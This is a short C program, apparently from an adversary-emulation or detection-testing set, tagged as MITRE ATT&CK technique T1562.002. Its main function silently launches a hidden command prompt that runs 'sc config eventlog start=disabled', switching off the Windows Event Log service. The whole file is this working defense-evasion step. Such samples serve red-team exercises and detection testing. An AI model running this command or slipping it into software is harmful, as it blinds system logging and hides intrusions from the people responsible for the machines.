// Link      = https://attack.mitre.org/techniques/T1562/002/
// Technique = Impair Defenses: Disable Windows Event Logging
// ID        = T1562.002
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)"cmd /c " to_run, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("sc config eventlog start=disabled");

    return 0;
}
